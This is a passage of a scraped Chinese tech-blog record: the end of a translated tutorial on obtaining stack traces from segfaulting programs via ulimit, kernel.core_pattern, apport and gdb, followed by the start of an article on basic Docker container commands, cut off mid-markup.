class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">seconds   </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ab7b878995837362216-4\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">file </span><span class=\"crayon-e\">size             </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">bytes     </span></div><div class=\"crayon-line\" id=\"crayon-5b4ab7b878995837362216-5\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">data </span><span class=\"crayon-e\">size             </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">bytes     </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ab7b878995837362216-6\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">stack </span><span class=\"crayon-i\">size</span><span class=\"crayon-h\">            </span><span class=\"crayon-cn\">8388608</span><span class=\"crayon-h\">              </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">bytes     </span></div><div class=\"crayon-line\" id=\"crayon-5b4ab7b878995837362216-7\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">core </span><span class=\"crayon-e\">file </span><span class=\"crayon-i\">size</span><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">                    </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">bytes     </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ab7b878995837362216-8\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">resident </span><span class=\"crayon-e\">set          </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">bytes     </span></div><div class=\"crayon-line\" id=\"crayon-5b4ab7b878995837362216-9\"><span class=\"crayon-e\">Max </span><span class=\"crayon-i\">processes</span><span class=\"crayon-h\">             </span><span class=\"crayon-cn\">30571</span><span class=\"crayon-h\">                </span><span class=\"crayon-cn\">30571</span><span class=\"crayon-h\">                </span><span class=\"crayon-e\">processes </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ab7b878995837362216-10\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">open </span><span class=\"crayon-i\">files</span><span class=\"crayon-h\">            </span><span class=\"crayon-cn\">1024</span><span class=\"crayon-h\">                 </span><span class=\"crayon-cn\">1048576</span><span class=\"crayon-h\">              </span><span class=\"crayon-e\">files     </span></div><div class=\"crayon-line\" id=\"crayon-5b4ab7b878995837362216-11\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">locked </span><span class=\"crayon-i\">memory</span><span class=\"crayon-h\">         </span><span class=\"crayon-cn\">65536</span><span class=\"crayon-h\">                </span><span class=\"crayon-cn\">65536</span><span class=\"crayon-h\">                </span><span class=\"crayon-e\">bytes     </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ab7b878995837362216-12\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">address </span><span class=\"crayon-e\">space         </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">bytes     </span></div><div class=\"crayon-line\" id=\"crayon-5b4ab7b878995837362216-13\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">file </span><span class=\"crayon-e\">locks            </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">locks     </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ab7b878995837362216-14\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">pending </span><span class=\"crayon-i\">signals</span><span class=\"crayon-h\">       </span><span class=\"crayon-cn\">30571</span><span class=\"crayon-h\">                </span><span class=\"crayon-cn\">30571</span><span class=\"crayon-h\">                </span><span class=\"crayon-e\">signals   </span></div><div class=\"crayon-line\" id=\"crayon-5b4ab7b878995837362216-15\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">msgqueue </span><span class=\"crayon-i\">size</span><span class=\"crayon-h\">         </span><span class=\"crayon-cn\">819200</span><span class=\"crayon-h\">               </span><span class=\"crayon-cn\">819200</span><span class=\"crayon-h\">               </span><span class=\"crayon-e\">bytes     </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ab7b878995837362216-16\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">nice </span><span class=\"crayon-i\">priority</span><span class=\"crayon-h\">         </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">                    </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">                    </span></div><div class=\"crayon-line\" id=\"crayon-5b4ab7b878995837362216-17\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">realtime </span><span class=\"crayon-i\">priority</span><span class=\"crayon-h\">     </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">                    </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">                    </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ab7b878995837362216-18\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">realtime </span><span class=\"crayon-e\">timeout      </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-i\">us</span><span class=\"crayon-h\">   </span></div><div class=\"crayon-line\" id=\"crayon-5b4ab7b878995837362216-19\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0041 seconds] -->\r\n<p>内核在决定写入多大的核心转储文件时使用软限制soft limit（在这种情况下，<code>max core file size = 0</code>）。 您可以使用 shell 内置命令 <code>ulimit</code>（<code>ulimit -c unlimited</code>） 将软限制增加到硬限制hard limit。</p>\n<h3 id=\"toc_5\">kernel.core_pattern：核心转储保存在哪里</h3>\n<p><code>kernel.core_pattern</code> 是一个内核参数，或者叫 “sysctl 设置”，它控制 Linux 内核将核心转储文件写到磁盘的哪里。</p>\n<p>内核参数是一种设定您的系统全局设置的方法。您可以通过运行 <code>sysctl -a</code> 得到一个包含每个内核参数的列表，或使用 <code>sysctl kernel.core_pattern</code> 来专门查看 <code>kernel.core_pattern</code> 设置。</p>\n<p>所以 <code>sysctl -w kernel.core_pattern=/tmp/core-%e.%p.%h.%t</code> 将核心转储保存到目录 <code>/tmp</code> 下，并以 <code>core</code> 加上一系列能够标识（出故障的）进程的参数构成的后缀为文件名。</p>\n<p>如果你想知道这些形如 <code>%e</code>、<code>%p</code> 的参数都表示什么，请参考 <a href=\"http://man7.org/linux/man-pages/man5/core.5.html\">man core</a>。</p>\n<p>有一点很重要，<code>kernel.core_pattern</code> 是一个全局设置 —— 修改它的时候最好小心一点，因为有可能其它系统功能依赖于把它被设置为一个特定的方式（才能正常工作）。</p>\n<h3 id=\"toc_6\">kernel.core_pattern 和 Ubuntu</h3>\n<p>默认情况下在 ubuntu 系统中，<code>kernel.core_pattern</code> 被设置为下面的值：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4ab7b87899b221482057\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ sysctl kernel.core_pattern\r\nkernel.core_pattern = |/usr/share/apport/apport %p %s %c %d %P\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4ab7b87899b221482057-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ab7b87899b221482057-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4ab7b87899b221482057-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4ab7b87899b221482057-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sysctl </span><span class=\"crayon-v\">kernel</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">core_pattern</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ab7b87899b221482057-2\"><span class=\"crayon-v\">kernel</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">core_pattern</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">share</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">apport</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">apport</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">s</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">c</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">d</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-i\">P</span></div><div class=\"crayon-line\" id=\"crayon-5b4ab7b87899b221482057-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p>这引起了我的迷惑（这 apport 是干什么的，它对我的核心转储做了什么？）。以下关于这个我了解到的：</p>\n<ul>\n<li>Ubuntu 使用一种叫做 apport 的系统来报告 apt 包有关的崩溃信息。</li>\n<li>设定 <code>kernel.core_pattern=|/usr/share/apport/apport %p %s %c %d %P</code> 意味着核心转储将被通过管道送给 <code>apport</code> 程序。</li>\n<li>apport 的日志保存在文件 <code>/var/log/apport.log</code> 中。</li>\n<li>apport 默认会忽略来自不属于 Ubuntu 软件包一部分的二进制文件的崩溃信息</li>\n</ul>\n<p>我最终只是跳过了 apport，并把 <code>kernel.core_pattern</code> 重新设置为 <code>sysctl -w kernel.core_pattern=/tmp/core-%e.%p.%h.%t</code>，因为我在一台开发机上，我不在乎 apport 是否工作，我也不想尝试让 apport 把我的核心转储留在磁盘上。</p>\n<h3 id=\"toc_7\">现在你有了核心转储，接下来干什么？</h3>\n<p>好的，现在我们了解了 <code>ulimit</code> 和 <code>kernel.core_pattern</code> ，并且实际上在磁盘的 <code>/tmp</code> 目录中有了一个核心转储文件。太好了！接下来干什么？我们仍然不知道该程序为什么会出现段错误！</p>\n<p>下一步将使用 <code>gdb</code> 打开核心转储文件并获取堆栈调用序列。</p>\n<h3 id=\"toc_8\">从 gdb 中得到堆栈调用序列</h3>\n<p>你可以像这样用 <code>gdb</code> 打开一个核心转储文件：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4ab7b8789a4487655141\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ gdb -c my_core_file\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4ab7b8789a4487655141-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ab7b8789a4487655141-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4ab7b8789a4487655141-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">gdb</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">c</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">my_core</span><span class=\"crayon-sy\">_</span>file</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ab7b8789a4487655141-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>接下来，我们想知道程序崩溃时的堆栈是什么样的。在 <code>gdb</code> 提示符下运行 <code>bt</code> 会给你一个调用序列backtrace。在我的例子里，<code>gdb</code> 没有为二进制文件加载符号信息，所以这些函数名就像 “??????”。幸运的是，（我们通过）加载符号修复了它。</p>\n<p>下面是如何加载调试符号。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4ab7b8789a7153064087\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsymbol-file /path/to/my/binary\r\nsharedlibrary\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4ab7b8789a7153064087-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ab7b8789a7153064087-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4ab7b8789a7153064087-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4ab7b8789a7153064087-1\"><span class=\"crayon-v\">symbol</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">file</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">path</span><span class=\"crayon-o\">/</span><span class=\"crayon-st\">to</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">my</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">binary</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ab7b8789a7153064087-2\"><span class=\"crayon-i\">sharedlibrary</span></div><div class=\"crayon-line\" id=\"crayon-5b4ab7b8789a7153064087-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>这从二进制文件及其引用的任何共享库中加载符号。一旦我这样做了，当我执行 <code>bt</code> 时，gdb 给了我一个带有行号的漂亮的堆栈跟踪！</p>\n<p>如果你想它能工作，二进制文件应该以带有调试符号信息的方式被编译。在试图找出程序崩溃的原因时，堆栈跟踪中的行号非常有帮助。:)</p>\n<h3 id=\"toc_9\">查看每个线程的堆栈</h3>\n<p>通过以下方式在 <code>gdb</code> 中获取每个线程的调用栈！</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4ab7b8789ab736823434\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nthread apply all bt full\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4ab7b8789ab736823434-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ab7b8789ab736823434-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4ab7b8789ab736823434-1\"><span class=\"crayon-e\">thread </span><span class=\"crayon-e\">apply </span><span class=\"crayon-e\">all </span><span class=\"crayon-e\">bt </span><span class=\"crayon-i\">full</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ab7b8789ab736823434-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<h3 id=\"toc_10\">gdb + 核心转储 = 惊喜</h3>\n<p>如果你有一个带调试符号的核心转储以及 <code>gdb</code>，那太棒了！您可以上下查看调用堆栈（LCTT 译注：指跳进调用序列不同的函数中以便于查看局部变量），打印变量，并查看内存来得知发生了什么。这是最好的。</p>\n<p>如果您仍然正在基于 gdb 向导来工作上，只打印出栈跟踪与bt也可以。 :)</p>\n<h3 id=\"toc_11\">ASAN</h3>\n<p>另一种搞清楚您的段错误的方法是使用 AddressSanitizer 选项编译程序（“ASAN”，即 <code>$CC -fsanitize=address</code>）然后运行它。 本文中我不准备讨论那个，因为本文已经相当长了，并且在我的例子中打开 ASAN 后段错误消失了，可能是因为 ASAN 使用了一个不同的内存分配器（系统内存分配器，而不是 tcmalloc）。</p>\n<p>在未来如果我能让 ASAN 工作，我可能会多写点有关它的东西。（LCTT 译注：这里指使用 ASAN 也能复现段错误）</p>\n<h3 id=\"toc_12\">从一个核心转储得到一个堆栈跟踪真的很亲切！</h3>\n<p>这个博客听起来很多，当我做这些的时候很困惑，但说真的，从一个段错误的程序中获得一个堆栈调用序列不需要那么多步骤：</p>\n<ol>\n<li>试试用 <code>valgrind</code></li>\n</ol>\n<p>如果那没用，或者你想要拿到一个核心转储来调查：</p>\n<ol>\n<li>确保二进制文件编译时带有调试符号信息；</li>\n<li>正确的设置 <code>ulimit</code> 和 <code>kernel.core_pattern</code>；</li>\n<li>运行程序；</li>\n<li>一旦你用 <code>gdb</code> 调试核心转储了，加载符号并运行 <code>bt</code>；</li>\n<li>尝试找出发生了什么！</li>\n</ol>\n<p>我可以使用 <code>gdb</code> 弄清楚有个 C++ 的虚表条目指向一些被破坏的内存，这有点帮助，并且使我感觉好像更懂了 C++ 一点。也许有一天我们会更多地讨论如何使用 <code>gdb</code> 来查找问题！</p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114211\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114211votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114211\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "IT技术,Linux", "url": "http://blog.jobbole.com/114211/", "url_obj_id": "5a2415268c5f41548f265013b49fd955"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2018/06/91d1e9a10762cf7191f39f8e66ebefa7.png"], "title": "8 个基本的 Docker 容器管理命令", "create_date": "2018/06/22 ·", "praise_num": 1, "fav_num": 0, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://kerneltalks.com/virtualization/8-basic-docker-container-management-commands/\">Shrikant Lavhate</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9768-1.html\">Linux中国/Lonaparte_CHENG</a>   </div><blockquote><p>利用这 8 个命令可以学习 Docker 容器的基本管理方式。这是一个为 Docker 初学者准备的，带有示范命令输出的指南。</p></blockquote>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/91d1e9a10762cf7191f39f8e66ebefa7.png\" alt=\"Docker 容器管理命令\"></p>\n<p>在这篇文章中，我们将带你学习 8 个基本的 Docker 容器命令，它们操控着 Docker 容器的基本活动，例如 运行run、 列举list、 停止stop、 查看历史纪录logs、 删除delete 等等。如果你对 Docker 的概念很陌生，推荐你看看我们的 <a href=\"https://kerneltalks.com/virtualization/what-is-docker-introduction-guide-to-docker/\">介绍指南</a>，来了解 Docker 的基本内容以及 <a href=\"https://kerneltalks.com/virtualization/how-to-install-docker-in-linux/\">如何</a> 在 Linux 上安装 Docker。 现在让我们赶快进入要了解的命令：</p>\n<h3 id=\"toc_1\">如何运行 Docker 容器？</h3>\n<p>众所周知，Docker 容器只是一个运行于宿主操作系统host OS上的应用进程，所以你需要一个镜像来运行它。Docker 镜像以进程的方式运行时就叫做 Docker 容器。你可以加载本地 Docker 镜像，也可以从 Docker Hub 上下载。Docker Hub 是一个提供公有和私有镜像来进行拉取pull操作的集中仓库。官方的 Docker Hub 位于 <a href=\"https://hub.docker.com/\">hub.docker.com</a>。 当你指示 Docker 引擎运行容器时，它会首先搜索本地镜像，如果没有找到，它会从 Docker Hub 上拉取相应的镜像。</p>\n<p>让我们运行一个 Apache web 服务器的 Docker 镜像，比如 httpd 进程。你需要运行 <code>docker container run</code> 命令。旧的命令为 <code>docker run</code>， 但后来 Docker 添加了子命令部分，所以新版本支持下列命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a7536da0a7523098532\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div 